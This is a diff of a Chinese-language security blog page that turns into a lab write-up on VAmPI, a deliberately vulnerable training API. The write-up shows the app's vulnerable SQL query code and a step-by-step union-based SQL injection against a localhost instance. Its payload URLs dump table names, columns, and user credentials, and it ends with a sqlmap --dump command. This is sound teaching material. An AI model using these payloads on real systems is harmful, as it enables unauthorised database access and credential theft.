@@ -6,7 +6,7 @@
   <meta charset="utf-8">
   <!-- SEO相关 -->
   
-  <link rel="canonical" href="https://blog.uuki.moe/friends/"/>
+  <link rel="canonical" href="https://blog.uuki.moe/2023/05/31/vampi-the-vulnerable-api/"/>
   <!-- 渲染优化 -->
     <meta http-equiv='x-dns-prefetch-control' content='on' />
       <link rel='dns-prefetch' href='https://unpkg.com'>
@@ -35,19 +35,21 @@
   <!-- feed -->
       <link rel="alternate" href="/atom.xml" title="Yuuki's blog" type="application/atom+xml">
   <!-- 页面元数据 -->
-  <title>Links - Yuuki's blog</title>
-  <meta name="keywords" content="Security blog">
-  <meta desc name="description" content="CyberSec | WebSec | Blog - yuuki - Yuuki's blog">
-  <meta property="og:type" content="website">
-<meta property="og:title" content="Links">
-<meta property="og:url" content="https://blog.uuki.moe/friends/index.html">
+  <title>Lab - VAmPI - 环境搭建 & SQL Injection - Yuuki's blog</title>
+  <meta name="keywords" content="Pentesting API,Security blog">
+  <meta desc name="description" content="VAmPI 是一个具有 OWASP Top 10 漏洞的 REST API 的程序, 可以通过一个开关来控制 API 是否易受攻击, 可以用于测试、学习、教学的目的。在 https://erev0s.com/blog/vampi-vulnerable-api-security-testing/ 可以看到更加全面的... - yuuki - Yuuki's blog">
+  
+<meta property="og:type" content="article">
+<meta property="og:title" content="Lab - VAmPI - 环境搭建 &amp; SQL Injection">
+<meta property="og:url" content="https://blog.uuki.moe/2023/05/31/VAmPI-The-Vulnerable-API/index.html">
 <meta property="og:site_name" content="Yuuki&#39;s blog">
+<meta property="og:description" content="VAmPI 是一个具有 OWASP Top 10 漏洞的 REST API 的程序, 可以通过一个开关来控制 API 是否易受攻击, 可以用于测试、学习、教学的目的。在 https:&#x2F;&#x2F;erev0s.com&#x2F;blog&#x2F;vampi-vulnerable-api-security-testing&#x2F; 可以看到更加全面的介绍。">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png">
-<meta property="article:published_time" content="2023-05-28T11:50:14.126Z">
-<meta property="article:modified_time" content="2023-05-28T11:50:14.125Z">
+<meta property="article:published_time" content="2023-05-30T19:50:16.000Z">
+<meta property="article:modified_time" content="2023-06-01T23:47:46.572Z">
 <meta property="article:author" content="yuuki">
-<meta property="article:tag" content="Security blog">
+<meta property="article:tag" content="Pentesting API">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png">
   <style>
@@ -2267,7 +2269,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 
 <script>
   window.pdata={}
-  pdata.ispage=false;
+  pdata.ispage=true;
   pdata.commentPath="";
   pdata.commentPlaceholder="";
   pdata.commentConfig={};
@@ -2346,6 +2348,8 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
       <p class="title"></p>
       <ul class='switcher nav-list-h m-phone'>
         <li><a id="s-comment" class="fa-solid fa-comments fa-fw" target="_self" title="comment"></a></li>
+        
+          <li><a id="s-toc" class="s-toc fa-solid fa-list fa-fw" target="_self" title="toc"></a></li>
         
       </ul>
     </div>
@@ -2595,9 +2599,17 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
       <div id="safearea">
         <div class="body-wrapper">
           
-<div id="l_main" class=' no_sidebar'>
-  <article id="friends" class="md post article article-entry l_friends white-box reveal shadow floatable blur article-type-friends" itemscope itemprop="blogPost">
-    
+<div id="l_main" class=''>
+  <article itemscope itemtype="http://schema.org/Article" class="article post white-box reveal md shadow floatable blur article-type-post" id="post" itemscope itemprop="blogPost">
+  <link itemprop="mainEntityOfPage" href="https://blog.uuki.moe/2023/05/31/VAmPI-The-Vulnerable-API/">
+  <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+    <meta itemprop="name" content="Yuuki's blog">
+  </span>
+  <span hidden itemprop="post" itemscope itemtype="http://schema.org/Post">
+    <meta itemprop="name" content="Yuuki's blog">
+    <meta itemprop="description" content="CyberSec | WebSec | Blog">
+  </span>
+  
 
 
   
@@ -2610,9 +2622,71 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     
     
       <h1 class="title" itemprop="name headline">
-        Links
+        Lab - VAmPI - 环境搭建 & SQL Injection
       </h1>
       <div class='new-meta-box'>
+        
+          
+            
+<div class='new-meta-item author' itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <a itemprop="url" class='author' href="https://blog.uuki.moe" rel="nofollow">
+    <img itemprop="image" src="https://s2.loli.net/2023/05/28/lKk7qO436LJAr2t.jpg" class="lazyload" data-srcset="https://s2.loli.net/2023/05/28/lKk7qO436LJAr2t.jpg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==">
+    <p itemprop="name">Yuuki</p>
+  </a>
+</div>
+
+          
+        
+          
+            
+  
+  
+  
+  <div class='new-meta-item category'>
+    <i class="fa-solid fa-folder-open fa-fw" aria-hidden="true"></i>
+    <a class="category-link" href="/categories/sec/">sec</a>
+    
+      <span hidden itemprop="about" itemscope itemtype="http://schema.org/Thing">
+        <a href="/categories/sec/" itemprop="url"><span itemprop="name">sec</span></a>
+      </span>
+    
+  </div>
+  
+
+
+
+          
+        
+          
+            <div class="new-meta-item date" itemprop="dateCreated datePublished" datetime="2023-05-31T03:50:16+08:00">
+  <a class='notlink'>
+    <i class="fa-solid fa-calendar-alt fa-fw" aria-hidden="true"></i>
+    <p>发布于：2023年5月31日</p>
+  </a>
+</div>
+
+          
+        
+          
+            
+
+
+<div class="new-meta-item browse">
+  <a class='notlink'>
+    <p>
+      <i class="fa-solid fa-eye fa-fw" aria-hidden="true"></i>
+      
+      <span id="busuanzi_value_page_pv">
+        <i class="fa-solid fa-loader fa-spin fa-fw" aria-hidden="true"></i>
+      </span>
+        
+      <span>次浏览</span>
+    </p>
+  </a>
+</div>
+
+
+          
         
         <!-- Custom Files topMeta begin-->
         
@@ -2622,39 +2696,176 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
   </div>
 
 
+  <div id="layoutHelper-page-plugins"></div>
+  <div id="post-body" itemprop="articleBody">
+    <p><a target="_blank" rel="noopener" href="https://github.com/erev0s/VAmPI">VAmPI</a> 是一个具有 OWASP Top 10 漏洞的 REST API 的程序, 可以通过一个开关来控制 API 是否易受攻击, 可以用于测试、学习、教学的目的。在 <a target="_blank" rel="noopener" href="https://erev0s.com/blog/vampi-vulnerable-api-security-testing/">https://erev0s.com/blog/vampi-vulnerable-api-security-testing/</a> 可以看到更加全面的介绍。</p>
+<span id="more"></span>
+
+<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>有三种搭建环境的方式, 分别是 Python, docker, docker-compose。本文使用 Python 搭建。</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/erev0s/VAmPI.git</span><br><span class="line"><span class="built_in">cd</span> VAmPI/</span><br><span class="line">python3 -m pip install -r requirements.txt</span><br></pre></td></tr></table></figure>
+
+<p>将环境拉倒本地后可以直接使用 <code>python3 app.py</code> 运行。在 <code>openapi_specs</code> 目录下有一个 <code>openapi3.yml</code>, 可以用于在 <a target="_blank" rel="noopener" href="https://editor.swagger.io/">swagger editor</a> 或 Postman 等工具生成 API 文档。</p>
+<p>为了避免与较新版本的 MacOS AirPlay Receiver 的端口冲突, 需要修改 <code>app.py</code> 与 <code>openapi3.yml</code> 内的端口号为 <code>5001</code></p>
+<p>使用 <code>python3 app.py</code> 启动服务后浏览器访问 <code>http://10.0.0.100:5001/</code>。在 Postman 导航栏选择 <strong>File</strong> -&gt; <strong>Import</strong> 导入 <code>openapi3.yml</code> 配置文件开始测试。</p>
+<h2 id="SQL-Injection"><a href="#SQL-Injection" class="headerlink" title="SQL Injection"></a>SQL Injection</h2><p>导致 SQL 注入的查询用户名接口为 <code>/users/v1/&#123;username&#125;</code>。功能函数 <code>get_user</code> 代码如下:</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@staticmethod</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_user</span>(<span class="params">username</span>):</span><br><span class="line">    <span class="keyword">if</span> vuln:  <span class="comment"># SQLi Injection</span></span><br><span class="line">        user_query = <span class="string">f&quot;SELECT * FROM users WHERE username = &#x27;<span class="subst">&#123;username&#125;</span>&#x27;&quot;</span></span><br><span class="line">        query = db.session.execute(text(user_query))</span><br><span class="line">        ret = query.fetchone()</span><br><span class="line">        <span class="keyword">if</span> ret:</span><br><span class="line">            fin_query = <span class="string">&#x27;&#123;&quot;username&quot;: &quot;%s&quot;, &quot;email&quot;: &quot;%s&quot;&#125;&#x27;</span> % (ret[<span class="number">1</span>], ret[<span class="number">3</span>])</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            fin_query = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        fin_query = User.query.filter_by(username=username).first()</span><br><span class="line">    <span class="keyword">return</span> fin_query</span><br></pre></td></tr></table></figure>
+
+<p>靶场 SQL 环境使用的是 SQLite 数据库, 需要注意 SQLite 没有库这个概念的, 查询语句中不需要指定数据库。</p>
+<p>查询语句 <code>user_query = f&quot;SELECT * FROM users WHERE username = &#39;&#123;username&#125;&#39;&quot;</code> 为<strong>字符型查询</strong>, 注入时使用单引号闭合。</p>
+<p>查询结果 <code>fin_query = &#39;&#123;&quot;username&quot;: &quot;%s&quot;, &quot;email&quot;: &quot;%s&quot;&#125;&#39; % (ret[1], ret[3])</code> 使用键 1 和 3 的位置作为响应结果, 故<strong>数据回显位</strong>在 2 和 4。</p>
+<h3 id="确定注入点"><a href="#确定注入点" class="headerlink" title="确定注入点"></a>确定注入点</h3><p>当用户存在将返回 <code>username</code>, <code>email</code></p>
+<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">[</span></span><br><span class="line">  <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;username&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&lt;string&gt;&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;email&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&lt;string&gt;&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;username&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&lt;string&gt;&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;email&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&lt;string&gt;&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">]</span></span><br></pre></td></tr></table></figure>
+
+<p>当用户不存在 <code>message</code> 将返回 <code>User not found</code></p>
+<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;status&quot;</span><span class="punctuation">:</span> <span class="string">&quot;fail&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;message&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&lt;string&gt;&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>单引号 <code>&#39;</code> 报错, 添加注释符号后页面正常显示, 判断注入点存在</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://localhost:5001/users/v1/1       # 正常</span><br><span class="line">http://localhost:5001/users/v1/1&#x27;      # 报错</span><br><span class="line">http://localhost:5001/users/v1/1&#x27; --+  # 正常</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../assets/VAmPI-The-Vulnerable-API/image-20230601_061815.png" class="lazyload" data-srcset="/../assets/VAmPI-The-Vulnerable-API/image-20230601_061815.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p>
+<p>在这里页面回显了查询语句 <code>SELECT * FROM users WHERE username = &#39;1&#39;&#39;</code> 明确指出这是字符型的注入点, 省略 <strong><a target="_blank" rel="noopener" href="https://pentestnote.uuki.moe/pentesting-web/sql-injection">确定闭合方式</a></strong> 这一步骤</p>
+<h3 id="判断查询结果列数"><a href="#判断查询结果列数" class="headerlink" title="判断查询结果列数"></a>判断查询结果列数</h3><p>使用 ORDER BY 语句判断查询结果列数。</p>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:5001/users/v1/1&#x27; union select ORDER BY 4 --+  # 正常</span><br><span class="line">http://127.0.0.1:5001/users/v1/1&#x27; union select ORDER BY 5 --+  # 正常</span><br><span class="line">http://127.0.0.1:5001/users/v1/1&#x27; union select ORDER BY 6 --+  # 报错</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../assets/VAmPI-The-Vulnerable-API/image-20230601_063959.png" class="lazyload" data-srcset="/../assets/VAmPI-The-Vulnerable-API/image-20230601_063959.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p>
+<p>当排序语句为 <code>ORDER BY 6</code> 时, 页面将报错, 判断查询结果为 5 列。</p>
+<h3 id="判断数据回显位"><a href="#判断数据回显位" class="headerlink" title="判断数据回显位"></a>判断数据回显位</h3><p>使用 <code>UNION</code> 联合查询判断数据回显位。</p>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:5001/users/v1/1&#x27; UNION SELECT 1,2,3,4,5 --+</span><br></pre></td></tr></table></figure>
+
+<p>本身 <code>username = 1</code> 结果并不存在, 服务器将会返回 UNION 查询语句的结果, 响应结果中包含 2, 4 , 说明 2 和 4 的位置是数据回显位。</p>
+<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;username&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;email&quot;</span><span class="punctuation">:</span> <span class="string">&quot;4&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="查询数据库信息"><a href="#查询数据库信息" class="headerlink" title="查询数据库信息"></a>查询数据库信息</h3><p>使用 sqlite 查看版本信息函数 <code>sqlite_version()</code> 查询数据库版本信息</p>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:5001/users/v1/1&#x27; UNION SELECT 1,sqlite_version(),3,4,5 FROM sqlite_schema --+</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 20230601101335</span></span><br><span class="line"><span class="comment">// http://127.0.0.1:5001/users/v1/1&#x27;%20UNION%20SELECT%201,sqlite_version(),3,4,5%20FROM%20sqlite_schema%20--+</span></span><br><span class="line"></span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;username&quot;</span><span class="punctuation">:</span> <span class="string">&quot;3.39.5&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;email&quot;</span><span class="punctuation">:</span> <span class="string">&quot;4&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="检索数据库数据"><a href="#检索数据库数据" class="headerlink" title="检索数据库数据"></a>检索数据库数据</h3><h4 id="查表名"><a href="#查表名" class="headerlink" title="查表名"></a>查表名</h4><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:5001/users/v1/1&#x27; UNION SELECT 1,group_concat(tbl_name),3,4,5 FROM sqlite_master WHERE type=&#x27;table&#x27; --+</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 20230601102601</span></span><br><span class="line"><span class="comment">// http://127.0.0.1:5001/users/v1/1&#x27;%20UNION%20SELECT%201,group_concat(tbl_name),3,4,5%20FROM%20sqlite_master%20WHERE%20type=&#x27;table&#x27;%20--+</span></span><br><span class="line"></span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;username&quot;</span><span class="punctuation">:</span> <span class="string">&quot;users,books&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;email&quot;</span><span class="punctuation">:</span> <span class="string">&quot;4&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="查字段"><a href="#查字段" class="headerlink" title="查字段"></a>查字段</h4><blockquote>
+<p>注意, 这里 <code>pragma_table_info(&#39;users&#39;)</code> 用于获取指定表的列信息，其中<code>name</code>是列名的字段。</p>
+</blockquote>
+<p>查询 <code>users</code> 表所有字段</p>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:5001/users/v1/1&#x27; UNION SELECT 1,group_concat(name),3,4,5 FROM pragma_table_info(&#x27;users&#x27;) --+</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;username&quot;</span><span class="punctuation">:</span> <span class="string">&quot;id,username,password,email,admin&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;email&quot;</span><span class="punctuation">:</span> <span class="string">&quot;4&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>查询 <code>books</code> 表所有字段</p>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:5001/users/v1/1&#x27; UNION SELECT 1,group_concat(name),3,4,5 FROM pragma_table_info(&#x27;books&#x27;) --+</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;username&quot;</span><span class="punctuation">:</span> <span class="string">&quot;id,book_title,secret_content,user_id&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;email&quot;</span><span class="punctuation">:</span> <span class="string">&quot;4&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="查数据"><a href="#查数据" class="headerlink" title="查数据"></a>查数据</h4><p>查询 <code>users</code> 表下 <code>username</code> 和 <code>password</code> 字段的数据</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:5001/users/v1/1&#x27; UNION SELECT 1,group_concat(printf(&#x27;%s@%s&#x27;,username,password)),3,4,5 FROM &#x27;users&#x27; --+</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;username&quot;</span><span class="punctuation">:</span> <span class="string">&quot;name1@pass1,name2@pass2,admin@pass1&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;email&quot;</span><span class="punctuation">:</span> <span class="string">&quot;4&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>查询 <code>books</code> 表下 <code>book_title</code> 和 <code>secret_content</code> 字段的数据</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:5001/users/v1/1&#x27; UNION SELECT 1,group_concat(printf(&#x27;%s@%s&#x27;,book_title,secret_content)),3,4,5 FROM &#x27;books&#x27; --+</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;username&quot;</span><span class="punctuation">:</span> <span class="string">&quot;bookTitle19@secret for bookTitle19,bookTitle56@secret for bookTitle56,bookTitle8@secret for bookTitle8&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;email&quot;</span><span class="punctuation">:</span> <span class="string">&quot;4&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>使用 <code>sqlmap</code> 对 URL 中的路径参数进行注入测试时, 可以使用星号 <code>*</code> 表示路径参数的位置, 使用 <code>sqlmap -u &quot;http://127.0.0.1:5001/users/v1/*&quot; --dump</code> 同样可以检索出数据库内所有的数据。</p>
+</blockquote>
+
+  </div>
+  
+  
     
-    
+    <div class='footer'>
+       <!-- 参考资料、相关资料等 -->
       
-        <div class='friends-group'>
-          <br>
-          <h2 class='friend-header'>
-            Friend Links
-          </h2>
-          
-          
-            <div class='simpleuser-group'>
-              
-                
-                  <a class="simpleuser" target="_blank" rel="external noopener noreferrer" href="https://blog.uuki.moe">
-                    <img src="https://s2.loli.net/2023/05/28/lKk7qO436LJAr2t.jpg" class="lazyload" data-srcset="https://s2.loli.net/2023/05/28/lKk7qO436LJAr2t.jpg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="/>
-                    <span>Yuuki</span>
-                  </a>
-                
-              
-                
-              
-            </div>
-          
-        </div>
+       <!-- 相关文章 -->
       
-    
-    <br><br>
-    
+      <!-- 版权声明组件 -->
+      
+      <!-- 打赏组件 -->
+      
+    </div>
+  
+  
     
 
 
   <div class='article-meta' id="bottom">
     <div class='new-meta-box'>
+      
+        
+          <div class="new-meta-item date" itemprop="dateModified" datetime="2023-06-02T07:47:46+08:00">
+  <a class='notlink'>
+    <i class="fa-solid fa-edit fa-fw" aria-hidden="true"></i>
+    <p>更新于：2023年6月2日</p>
+  </a>
+</div>
+
+        
+      
+        
+          
+  
+  
+  
+  <div class="new-meta-item meta-tags"><a class="tag" href="/tags/Pentesting-API/" rel="nofollow"><i class="fa-solid fa-hashtag fa-fw" aria-hidden="true"></i><p>Pentesting API</p></a></div>
+  <span hidden itemprop="keywords">Pentesting API</span>
+  
+
+
+        
+      
+        
+          
+  <div class="new-meta-item share -mob-share-list">
+  <div class="-mob-share-list share-body">
+    
+      
+        <a class="-mob-share-qq" title="" rel="external nofollow noopener noreferrer noopener"
+          
+          target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://blog.uuki.moe/2023/05/31/VAmPI-The-Vulnerable-API/&title=Lab - VAmPI - 环境搭建 & SQL Injection - Yuuki's blog&summary=VAmPI 是一个具有 OWASP Top 10 漏洞的 REST API 的程序, 可以通过一个开关来控制 API 是否易受攻击, 可以用于测试、学习、教学的目的。在 https://erev0s.com/blog/vampi-vulnerable-api-security-testing/ 可以看到更加全面的介绍。"
+          
+          >
+          
+            <img src="https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/logo/128/qq.png" class="lazyload" data-srcset="https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/logo/128/qq.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==">
+          
+        </a>
+      
+    
+      
+        <a class="-mob-share-qzone" title="" rel="external nofollow noopener noreferrer noopener"
+          
+          target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=https://blog.uuki.moe/2023/05/31/VAmPI-The-Vulnerable-API/&title=Lab - VAmPI - 环境搭建 & SQL Injection - Yuuki's blog&summary=VAmPI 是一个具有 OWASP Top 10 漏洞的 REST API 的程序, 可以通过一个开关来控制 API 是否易受攻击, 可以用于测试、学习、教学的目的。在 https://erev0s.com/blog/vampi-vulnerable-api-security-testing/ 可以看到更加全面的介绍。"
+          
+          >
+          
+            <img src="https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/logo/128/qzone.png" class="lazyload" data-srcset="https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/logo/128/qzone.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==">
+          
+        </a>
+      
+    
+      
+        <a class="-mob-share-weibo" title="" rel="external nofollow noopener noreferrer noopener"
+          
+          target="_blank" href="http://service.weibo.com/share/share.php?url=https://blog.uuki.moe/2023/05/31/VAmPI-The-Vulnerable-API/&title=Lab - VAmPI - 环境搭建 & SQL Injection - Yuuki's blog&summary=VAmPI 是一个具有 OWASP Top 10 漏洞的 REST API 的程序, 可以通过一个开关来控制 API 是否易受攻击, 可以用于测试、学习、教学的目的。在 https://erev0s.com/blog/vampi-vulnerable-api-security-testing/ 可以看到更加全面的介绍。"
+          
+          >
+          
+            <img src="https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/logo/128/weibo.png" class="lazyload" data-srcset="https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/logo/128/weibo.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==">
+          
+        </a>
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+
+
+        
       
     </div>
     <!-- Custom Files bottomMeta begin -->
@@ -2663,14 +2874,40 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
   </div>
 
 
-  </article>
   
+  
+
+  
+    <div class="prev-next">
+      
+      
+        <a class='next' href='/2023/05/28/hello-world/'>
+          <p class='title'>Hello World<i class="fa-solid fa-chevron-right" aria-hidden="true"></i></p>
+          <p class='content'>Welcome to my blog. 👋 这是第一个帖子, 记录了这个站点的诞生。
+
+
+ TimeLog 
+              
+              2023-05-28编辑...</p>
+        </a>
+      
+    </div>
+  
+  <!-- 文章推荐 -->
+  
+  
+  <!-- Custom Files postEnd begin-->
+  
+  <!-- Custom Files postEnd end-->
+</article>
+
+
   
 
 
   <article class="post white-box shadow floatable blur" id="comments">
     <span hidden>
-      <meta itemprop="discussionUrl" content="/friends/index.html#comments">
+      <meta itemprop="discussionUrl" content="/2023/05/31/VAmPI-The-Vulnerable-API/index.html#comments">
     </span>
     <p ct><i class='fa-solid fa-comments'></i> 评论</p>
     
@@ -2681,13 +2918,42 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 
 
 
-  
+
+
+
 </div>
 <aside id='l_side' itemscope itemtype="http://schema.org/WPSideBar">
   
 
+  
+    
+    
+      
+    
+  
+
 
 <div class="widget-sticky">
+
+  
+  
+
+
+<section class="widget toc-wrapper desktop mobile" id="toc-div" >
+  
+  <header>
+    
+      <i class="fa-solid fa-list fa-fw" aria-hidden="true"></i><span class='name'>CONTENTS</span>
+    
+  </header>
+
+
+  <div class='content'>
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL-Injection"><span class="toc-text">SQL Injection</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A1%AE%E5%AE%9A%E6%B3%A8%E5%85%A5%E7%82%B9"><span class="toc-text">确定注入点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E6%9F%A5%E8%AF%A2%E7%BB%93%E6%9E%9C%E5%88%97%E6%95%B0"><span class="toc-text">判断查询结果列数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E6%95%B0%E6%8D%AE%E5%9B%9E%E6%98%BE%E4%BD%8D"><span class="toc-text">判断数据回显位</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E8%AF%A2%E6%95%B0%E6%8D%AE%E5%BA%93%E4%BF%A1%E6%81%AF"><span class="toc-text">查询数据库信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A3%80%E7%B4%A2%E6%95%B0%E6%8D%AE%E5%BA%93%E6%95%B0%E6%8D%AE"><span class="toc-text">检索数据库数据</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9F%A5%E8%A1%A8%E5%90%8D"><span class="toc-text">查表名</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9F%A5%E5%AD%97%E6%AE%B5"><span class="toc-text">查字段</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9F%A5%E6%95%B0%E6%8D%AE"><span class="toc-text">查数据</span></a></li></ol></li></ol></li></ol>
+  </div>
+</section>
+
+  
 
 </div>
 
@@ -2695,6 +2961,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
   
   <!-- Custom Files side end -->
 </aside>
+
 
 
         </div>
@@ -3706,7 +3973,7 @@ window.matchMedia('(prefers-color-scheme: light)').addListener(darkModelListener
 </script>
 
 
